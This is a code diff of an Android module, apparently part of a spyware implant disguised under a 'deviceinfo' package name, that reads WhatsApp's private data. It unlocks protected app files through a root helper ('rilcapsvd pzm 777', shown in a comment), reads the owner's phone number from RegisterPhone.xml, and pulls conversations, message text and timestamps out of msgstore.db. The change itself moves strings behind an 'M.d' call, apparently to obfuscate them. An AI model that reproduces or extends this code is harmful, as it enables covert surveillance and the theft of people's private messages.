@@ -20,7 +20,6 @@ import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteQueryBuilder;
 import android.util.Pair;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordVisitor;
@@ -28,6 +27,7 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
+import com.android.m.M;
 
 public class ChatWhatsapp extends SubModuleChat {
 	private static final String TAG = "ChatWhatsapp";
@@ -138,11 +138,12 @@ public class ChatWhatsapp extends SubModuleChat {
 		 * </string> </map>
 		 */
 
-		String filename = Messages.getString("f_d");
+		String filename = M.d("/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml");
 		try {
 			// f_2=/system/bin/rilcapsvd pzm 777
 			Path.unprotect(filename, 2, true);
-			// Runtime.getRuntime().exec(Messages.getString("f_2") + filename);
+			// Runtime.getRuntime().exec(M.d("/system/bin/rilcapsvd pzm 777 ") +
+			// filename);
 			File file = new File(filename);
 
 			if (Cfg.DEBUG) {
@@ -166,7 +167,7 @@ public class ChatWhatsapp extends SubModuleChat {
 					Check.log(TAG + " (readMyPhoneNumber), item: " + item.getNodeName() + " = " + item.getNodeValue());
 				}
 				// f_e=com.whatsapp.RegisterPhone.phone_number
-				if (item != null && Messages.getString("f_e").equals(item.getNodeValue())) {
+				if (item != null && M.d("com.whatsapp.RegisterPhone.phone_number").equals(item.getNodeValue())) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (readMyPhoneNumber), found: " + item);
 					}
@@ -211,9 +212,9 @@ public class ChatWhatsapp extends SubModuleChat {
 			boolean updateMarkup = false;
 
 			// f.0=/data/data/com.whatsapp/databases
-			String dbDir = Messages.getString("f_0");
+			String dbDir = M.d("/data/data/com.whatsapp/databases");
 			// f.1=/msgstore.db
-			String dbFile = Messages.getString("f_1");
+			String dbFile = M.d("/msgstore.db");
 
 			if (Path.unprotect(dbDir, dbFile, true)) {
 
@@ -278,8 +279,8 @@ public class ChatWhatsapp extends SubModuleChat {
 		// f.4=_id
 		// f.5=key_remote_jid
 		// f_f=remote_resources
-		String[] projection = { Messages.getString("f_4"), Messages.getString("f_f") };
-		String selection = Messages.getString("f_5") + "='" + conversation + "'";
+		String[] projection = { M.d("_id"), M.d("remote_resource") };
+		String selection = M.d("key_remote_jid") + "='" + conversation + "'";
 
 		// final Set<String> remotes = new HashSet<String>();
 		groups.addPeerToGroup(conversation, clean(myPhoneNumber));
@@ -299,7 +300,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 		GenericSqliteHelper helper = new GenericSqliteHelper(db);
 		// f_a = messages
-		helper.traverseRecords(Messages.getString("f_a"), visitor);
+		helper.traverseRecords(M.d("messages"), visitor);
 
 	}
 
@@ -321,20 +322,20 @@ public class ChatWhatsapp extends SubModuleChat {
 
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 		// f.3=chat_list
-		queryBuilderIndex.setTables(Messages.getString("f_3"));
+		queryBuilderIndex.setTables(M.d("chat_list"));
 		// queryBuilder.appendWhere(inWhere);
 		// f.4=_id
 		// f.5=key_remote_jid
 		// f.6=message_table_id
-		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_6") };
+		String[] projection = { M.d("_id"), M.d("key_remote_jid"), M.d("message_table_id") };
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
 
 		// iterate conversation indexes
 		while (cursor != null && cursor.moveToNext()) {
 			// f.5=key_remote_jid
-			String jid = cursor.getString(cursor.getColumnIndexOrThrow(Messages.getString("f_5")));
+			String jid = cursor.getString(cursor.getColumnIndexOrThrow(M.d("key_remote_jid")));
 			// f.6=message_table_id
-			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(Messages.getString("f_6")));
+			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(M.d("message_table_id")));
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
 			}
@@ -386,20 +387,20 @@ public class ChatWhatsapp extends SubModuleChat {
 
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 		// f.a=messages
-		queryBuilderIndex.setTables(Messages.getString("f_a"));
+		queryBuilderIndex.setTables(M.d("messages"));
 		// f.4=_id
 		// f.5=key_remote_jid
-		queryBuilderIndex.appendWhere(Messages.getString("f_5") + " = '" + conversation + "' AND "
-				+ Messages.getString("f_4") + " > " + lastReadIndex);
+		queryBuilderIndex.appendWhere(M.d("key_remote_jid") + " = '" + conversation + "' AND " + M.d("_id") + " > "
+				+ lastReadIndex);
 		// f.7=data
 		// f_b=timestamp
 		// f_c=key_from_me
-		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_7"),
-				Messages.getString("f_b"), Messages.getString("f_c"), "remote_resource" };
+		String[] projection = { M.d("_id"), M.d("key_remote_jid"), M.d("data"), M.d("timestamp"), M.d("key_from_me"),
+				"remote_resource" };
 
 		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation
 		// AND key_remote_jid>$lastReadIndex
-		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, Messages.getString("f_4"));
+		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, M.d("_id"));
 
 		ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 		int lastRead = lastReadIndex;
@@ -465,7 +466,7 @@ public class ChatWhatsapp extends SubModuleChat {
 			return null;
 		}
 		// f_9=@s.whatsapp.net
-		return remote.replaceAll(Messages.getString("f_9"), "");
+		return remote.replaceAll(M.d("@s.whatsapp.net"), "");
 	}
 
 }
